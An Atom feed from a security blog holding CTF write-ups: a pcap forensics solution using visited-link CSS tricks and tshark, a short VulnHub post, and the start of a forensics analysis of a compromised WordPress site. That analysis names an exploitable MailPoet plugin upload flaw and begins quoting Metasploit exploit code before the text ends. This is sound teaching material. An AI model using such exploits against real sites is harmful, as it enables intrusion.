<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[The Swappage Playground]]></title>
  <link href="http://swappage.github.io/atom.xml" rel="self"/>
  <link href="http://swappage.github.io/"/>
  <updated>2014-10-09T23:17:04+02:00</updated>
  <id>http://swappage.github.io/</id>
  <author>
    <name><![CDATA[Swappage]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SU-CTF 2014: Personalized Captcha]]></title>
    <link href="http://swappage.github.io/blog/2014/10/09/su-ctf-2014-personalized-captcha/"/>
    <updated>2014-10-09T22:09:39+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/09/su-ctf-2014-personalized-captcha</id>
    <content type="html"><![CDATA[<p>Second CTF for the VulnHub team, and lots of fun with these puzzles.</p>

<p>This writeup is all about an interesting forensics and web game named &ldquo;Personalized captcha&rdquo; where the players were challenged to discover the value of a captcha string by analizing a provided pcap file.</p>

<!-- more -->


<p>The pcap file was ~9MB in size, which is not big, but for sure bigger then usual for a CTF puzzle, and by a first look at it using wireshark it looked fairly messy, especially in terms of HTTP traffic, considering that a fairly good amount of HTTP requests and streams where in there.</p>

<p>Sorting things out by hand would have been fairly challenging, and when playing a CTF, you really have to be as fast as possible, so i decided to rely on a NFAT (Network forensics analysis tool) named Xplico, available in kali for dissecting it.</p>

<p>This tool is excellent for dissecting even big (100MB+) pcap files, and has really powerful filtering and search features, especially when you need to rebuild content for analysis, like web pages, images, audio files, voip communications and so on.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/packet_summary.png"></p>

<p>Punching the pcap into the software made things clearer and more understandable then by simply looking at raw packets in wireshark, and in the first place i started looking at the sites the user visited.</p>

<p>The challenge hinted the players about the domain <em>captcha.ctf.sharif.edu</em> being down, which of course dragged me into digging more in depth about anything that i could find in the pcap about that domain.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/sharif_captcha.png"></p>

<p>A quick search revealed that the user for whom we were trying to rebuild the captcha actually visited that site; i focused some effort in dissecting the communications between the user and the server, i went sure on a post request that seemed interesting but unfortunately the user never really submitted the captcha, so, unfortunately, not a chance to grab it from the POST request, even if it wasn&rsquo;t encrypted.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/post.png"></p>

<p>Well, in the end this was a 300 points worth puzzle, wouldn&rsquo;t it be too easy that way?</p>

<p>Anyway, back to the challenge, at this point it was probably a good idea to try to rebuild the pages content.</p>

<p>Xplico in these things really rocks the world, because it can preview the content of web pages by rebuilding them entirely off a pcap file, i tried previewing the page as i usually do, but this time something went wrong.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/badpage.png"></p>

<p>For the good actually, because this helped me in understanding the point of the puzzle (more on this later), but the page looked really weird, by quickly inspecting the source, I noticed that 2 CSS files were included in the html, but if we look at them in Xplico we can notice that the <em>style.css</em> was 0 bytes in size.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!doctype html&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;head&gt;</span>
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;title&gt;</span>The Captcha<span class="nt">&lt;/title&gt;</span>
</span><span class='line'>  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/bootstrap.css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/style.css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/head&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'>...
</span><span class='line'><span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://swappage.github.io/images/2014-10-09/wrongsize.png"></p>

<p>mhh.. odd isn&rsquo;t it? i double checked using wireshark and it actually resulted that something DID went wrong in pcap dissection by Xplico, did the challenge author know something i didn&rsquo;t? was this done on purpose?</p>

<p>Yet, wireshark revealed the truth and at this point i decided to export the files directly from wireshark and restore their original paths so that the page would display properly; luckly wireshark provides an awesome feature to export files from HTTP strams, so it was just a matter of a couple of mouse clicks to get everything i needed.</p>

<p>Opening the web page in the browser revealed what was the page as it appeared to the user whom this traffic capture belonged to</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/wholepage.png"></p>

<p>except for the fact, that the captcha was empty.</p>

<p>Yet, pieces of the puzzle were starting to make sense if put togeder; now i had a captcha field, but where are the links that i could see without the <em>style.css</em>?</p>

<p>Let&rsquo;s take a look at the whole page code</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!doctype html&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;head&gt;</span>
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;title&gt;</span>The Captcha<span class="nt">&lt;/title&gt;</span>
</span><span class='line'>  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/bootstrap.css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/style.css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/head&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;container&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;row&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;col-xs-8 col-xs-offset-2 col-md-6 col-md-offset-3&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>          <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>              <span class="nt">&lt;textarea</span> <span class="na">class=</span><span class="s">&quot;form-control mb5&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;comment&quot;</span> <span class="na">name=</span><span class="s">&quot;comment&quot;</span><span class="nt">&gt;&lt;/textarea&gt;</span>
</span><span class='line'>              <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">class=</span><span class="s">&quot;form-control mb5&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;captcha&quot;</span> <span class="na">name=</span><span class="s">&quot;captcha&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>
</span><span class='line'>              <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;captcha&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wikipedia.org/wiki/Hack&quot;</span><span class="nt">&gt;</span>P<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://wordpress.org/plugins/captcha/&quot;</span><span class="nt">&gt;</span>E<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://wordpress.org/mobile/&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://captchas.net/&quot;</span><span class="nt">&gt;</span>C<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wikipedia.org/wiki/Hack&quot;</span><span class="nt">&gt;</span>E<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.thefreedictionary.com/hack&quot;</span><span class="nt">&gt;</span>Y<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.php.net/manual/en/security.database.sql-injection.php&quot;</span><span class="nt">&gt;</span>E<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.unixwiz.net/techtips/sql-injection.html&quot;</span><span class="nt">&gt;</span>T<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.google.com/recaptcha/intro/index.html&quot;</span><span class="nt">&gt;</span>V<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wikipedia.org/wiki/OWASP&quot;</span><span class="nt">&gt;</span>U<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.phpcaptcha.org/documentation/quickstart-guide/&quot;</span><span class="nt">&gt;</span>L<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.merriam-webster.com/dictionary/hack&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.urbandictionary.com/define.php?term=hack&quot;</span><span class="nt">&gt;</span>N<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.hackthissite.org/&quot;</span><span class="nt">&gt;</span>D<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.phpcaptcha.org/posts/wordpress-plugin-released/&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wiktionary.org/wiki/hack&quot;</span><span class="nt">&gt;</span>H<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.captcha.net/&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://captchas.net/sample/php/&quot;</span><span class="nt">&gt;</span>C<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.phpcaptcha.org/download/wordpress-plugin/&quot;</span><span class="nt">&gt;</span>K<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>              <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>              <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">class=</span><span class="s">&quot;btn btn-primary btn-block&quot;</span><span class="nt">&gt;</span>send<span class="nt">&lt;/button&gt;</span>
</span><span class='line'>          <span class="nt">&lt;/form&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'><span class="nt">&lt;/div&gt;</span>
</span><span class='line'><span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>and at the <em>style.css</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='css'><span class='line'><span class="nf">#captcha</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">width</span><span class="o">:</span> <span class="m">300px</span><span class="p">;</span>
</span><span class='line'>  <span class="k">height</span><span class="o">:</span> <span class="m">100px</span><span class="p">;</span>
</span><span class='line'>  <span class="k">margin-right</span><span class="o">:</span> <span class="k">auto</span><span class="p">;</span>
</span><span class='line'>  <span class="k">margin-left</span><span class="o">:</span> <span class="k">auto</span><span class="p">;</span>
</span><span class='line'>  <span class="k">position</span><span class="o">:</span> <span class="k">relative</span><span class="p">;</span>
</span><span class='line'>  <span class="k">background-color</span><span class="o">:</span> <span class="m">#000000</span><span class="p">;</span>
</span><span class='line'>  <span class="k">white-space</span><span class="o">-</span><span class="k">collapse</span><span class="o">:</span> <span class="n">discard</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">font-size</span><span class="o">:</span> <span class="m">15px</span><span class="p">;</span>
</span><span class='line'>  <span class="k">pointer</span><span class="o">-</span><span class="n">events</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="k">cursor</span><span class="o">:</span> <span class="k">default</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">touch</span><span class="o">-</span><span class="n">callout</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">khtml</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">moz</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class='line'>  <span class="k">position</span><span class="o">:</span> <span class="k">absolute</span><span class="p">;</span>
</span><span class='line'>  <span class="k">display</span><span class="o">:</span> <span class="k">inline</span><span class="o">-</span><span class="k">block</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span><span class="o">,</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:hover</span><span class="o">,</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:focus</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">color</span><span class="o">:</span> <span class="m">#000000</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:visited</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">color</span><span class="o">:</span> <span class="m">#ff0000</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">left</span><span class="o">:</span> <span class="m">3.45699886px</span><span class="p">;</span>
</span><span class='line'>  <span class="k">top</span><span class="o">:</span> <span class="m">26.46903004px</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-3</span><span class="o">.</span><span class="m">45879735</span><span class="n">deg</span><span class="p">);</span>
</span><span class='line'>  <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-3</span><span class="o">.</span><span class="m">45879735</span><span class="n">deg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-3</span><span class="o">.</span><span class="m">45879735</span><span class="n">deg</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:nth-child</span><span class="o">(</span><span class="nt">2</span><span class="o">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">left</span><span class="o">:</span> <span class="m">19.42964103px</span><span class="p">;</span>
</span><span class='line'>  <span class="k">top</span><span class="o">:</span> <span class="m">28.76705699px</span><span class="p">;</span>
</span><span class='line'>  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-9</span><span class="o">.</span><span class="m">34001927</span><span class="n">deg</span><span class="p">);</span>
</span><span class='line'>  <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-9</span><span class="o">.</span><span class="m">34001927</span><span class="n">deg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-9</span><span class="o">.</span><span class="m">34001927</span><span class="n">deg</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Oh&hellip; Ok, now i get it, the links are building the captcha!</p>

<p>Let&rsquo;s try this out: i tried to visit one of the links from the page source, so that they would appear as visited to the browser, and by refreshing the captcha page i was presented with a pleasant surprise.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/partial_captcha.png"></p>

<p>So now i had the point of the challenge! Basically the captcha string depended on the sites visited by the user, what i needed to do, to obtain the captcha string was to verify which sites among the ones in the captcha page were present in the pcap, respecting the following criteria:</p>

<ul>
<li>the site should have been visited before <a href="http://captcha.ctf.sharif.edu/captcha/">http://captcha.ctf.sharif.edu/captcha/</a> was visited (there were a couple of browsing sessions after that)</li>
<li>the source ip address should have been the same (better making sure not to include other potential users)</li>
<li>the browser used should have been always the same as the one used for visiting the captcha page (in the pcap multiple user agents were present)</li>
</ul>


<p>doing the search by end in wireshark would have been frustrating, even by using filters, so i created a filter like the following</p>

<pre><code>frame.number &lt; 14127 &amp;&amp; ip.src == 10.10.12.30 &amp;&amp; http.user_agent == "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chrome/20.0.1132.47 Safari/536.11" &amp;&amp; http.request.full_uri == ""
</code></pre>

<p>And with the help of some basic bash scripting i cycled through the links in the captcha page to see if they were visited or not.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="nv">URLS</span><span class="o">=</span><span class="k">$(</span>grep <span class="s2">&quot;a href&quot;</span> captcha.htm <span class="p">|</span> awk -F <span class="s1">&#39;\&quot;&#39;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> url in <span class="nv">$URLS</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>      <span class="nv">FILTER</span><span class="o">=</span><span class="s2">&quot;frame.number &lt; 14127 &amp;&amp; ip.src == 10.10.12.30 &amp;&amp; http.user_agent == \&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chrome/20.0.1132.47 Safari/536.11\&quot; &amp;&amp; http.request.full_uri == \&quot;$url\&quot;&quot;</span>
</span><span class='line'>      <span class="nv">VISITED</span><span class="o">=</span><span class="k">$(</span>tshark -R <span class="s2">&quot;$FILTER&quot;</span> -r captcha.pcap 2&gt; /dev/null <span class="p">|</span> wc -l<span class="k">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="o">[</span> <span class="nv">$VISITED</span> -ne <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span><span class='line'>              <span class="nb">echo</span> <span class="nv">$url</span>
</span><span class='line'>      <span class="k">fi</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>All was left to do was to take the returned URLs, open them in the browser and see the resulting captcha</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/solvedcaptcha.png"></p>

<p>What else can i say? well, i think i&rsquo;ll probably submit this pcap file to the Xplico dev team so that they can check why <em>style.css</em> wasn&rsquo;t decoded properly.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulnhub Competition: Persistence]]></title>
    <link href="http://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/"/>
    <updated>2014-10-06T23:35:09+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence</id>
    <content type="html"><![CDATA[<p>Only a couple of hours have past since Persistence <a href="http://www.vulnhub.com/">VulnHub</a> competition ended.</p>

<p>Of course, again, as a VulnHub addict as i am, i couldn&rsquo;t refrain my urge to partecipate and feel the pain :)</p>

<p>I really enjoyed playing this vulnerable VM, and the reward for such an high amount of frustration was a lot and lot of fun.</p>

<p>Many people partecipated this time, way more then the ones who took part in the Hades challenge, and this is a demonstration that VulnHub is getting more and more popular every day.</p>

<!-- more -->


<p>Now that the competition is over, i feel like i want to share my submission with everyone, by linking the PDF directly here&hellip; yes, i know, i&rsquo;m lazy, but i don&rsquo;t feel like copying and pasting it into a blog post, considering the result would be pretty much the same :).</p>

<p>And yes yes, i also know that my english is terrible, but i think that it is, at a bare minimum, at least understandable.</p>

<p>I intend to use this post also to thank <a href="http://blog.techorganic.com/">Superkojiman</a>, sagi- for the effort and time spent in putting togeder this funny VM, and of course <a href="http://www.vulnhub.com/">VulnHub</a> staff that every day put a lot of energy in keeping the great project going for the good of the community, by providing an awesome playground for having fun and learning stuff free of charge :)</p>

<p>For those who are still interested in reading it, here is my writeup (in PDF format): <a href="http://swappage.github.io/images/2014-10-06/persistence.pdf">Persistence</a></p>

<p>Oh, and i almost forgot, <a href="http://download.vulnhub.com/media/persistence/">here</a> you can find other writeups from other people who made a submissions, for your reading pleasure.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2014: Fluffy No More]]></title>
    <link href="http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more/"/>
    <updated>2014-09-28T16:44:18+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more</id>
    <content type="html"><![CDATA[<p>The CSAW CTF 2014 wasn&rsquo;t only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles.</p>

<p>Fluffy No More was a 300 points worth challenge for which the solution could have been achieved by conducting a full scope forensics analysis of a compromised system.</p>

<p>The players were provided with an archive containing</p>

<ul>
<li>a database dump</li>
<li>the content of /var/log</li>
<li>the content of /var/www/html</li>
<li>the content of /etc</li>
</ul>


<p>All the informations were (badly imho) logically acquired from the compromised system, and the challenge was focused mostly on forensics methodology: if the player was good enaugh to understand what happened on the system, he&rsquo;d find the hidden flag.</p>

<!-- more -->


<p>First thing first, let&rsquo;s say that this is how I solved the puzzle, probably there were other easier paths, but I still decided to approach this game like it was a real case, thinking that it was the best way to not leave anything behind.</p>

<p>The fictional scenario involved a compromised wordpress blog, so as a first step, i decided that it was worth to find a clue about how the attacker compromised it.</p>

<p>I had the logs from the web server, but like in any webserver logs, when analyzing them you run through lots of false positives, and this was also the case; reason why I decided to start by looking at the database dump.</p>

<p>To make my life easier, i quickly imported the database and the blog site on a lab machine, and started looking into it:
It was a matter of no time that I could spot a comment to a blog post boasting about the will of compromising the site.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/comment.png"></p>

<p>I remembered that wordpress, in the comments table, has a field where the IP address of the posting user is saved, I decided to take a look at it, because i thought that it could have been useful in terms of correlations with the apache webserver logs. In most cases this is not gonna happen, you&rsquo;ll unlikely be so lucky, but I was approaching to a CTF problem, not a real world scenario, and so I decided to bet on this.</p>

<pre><code>+------------+----------------+-------------------+
| comment_ID | comment_author | comment_author_IP |
+------------+----------------+-------------------+
|          4 | Hacker         | 192.168.127.130   |
+------------+----------------+-------------------+
</code></pre>

<p>Messing with the logs at this poit was a possibility, but i decided that probably if I had more details on the wordpress installation itself, this would have helped me out more in filtering the log results.</p>

<p>I reset my instance of the blog and logged in as admin to check for the list of installed plugins, and verify if at least one of them was vulnerable.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/mailpoet.png"></p>

<p>Mail Poet newsletter pulled my attention as it was the only plugin that was alerting that a new version was available, so why not look in public repositories if an exploit for the installed version is available?</p>

<p>I browsed exploit-db and it resulted that a metasploit module to gain remote code execution on this specific wordpress plugin is available.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/edb.png"></p>

<p>By a quick look at the exploit code, it&rsquo;s possible to figure out that an attacker can upload an arbitrary payload by sending the following POST request</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span>
